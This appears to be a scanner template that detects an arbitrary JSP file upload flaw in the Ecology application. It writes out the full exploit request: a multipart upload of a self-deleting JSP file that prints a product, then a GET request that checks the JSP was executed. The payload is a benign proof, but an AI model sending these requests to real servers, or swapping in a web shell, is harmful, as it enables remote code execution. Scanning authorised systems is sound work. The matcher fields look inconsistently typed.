id: ecology-arbitrary-file-upload
brief:
    title: Ecology - Arbitrary File Upload
    by: ritikchaddha
    level: critical
    about: Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a r...
    label:
        - ecology
        - fileupload
        - intrusive
        - vuln
    score: CVSS:9.8
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/page/exportImport/uploadOperation.jsp'
      head:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
      body: |-
        ------WebKitFormBoundaryFy3iNVBftjP6IOwo
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
        Content-Type: application/octet-stream

        <%out.print(364536*876356);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
      signs:
        - "on": word
          has:
            - status_code_1 == 200
            - contains(body_2, '319463310816') || status_code_2 == 200
          in: body
          need: all
    - verb: GET
      to:
        - '{{BaseURL}}/page/exportImport/fileTransfer/{{randstr}}.jsp'
      signs:
        - "on": word
          has:
            - status_code_1 == 200
            - contains(body_2, '319463310816') || status_code_2 == 200
          in: body
          need: all
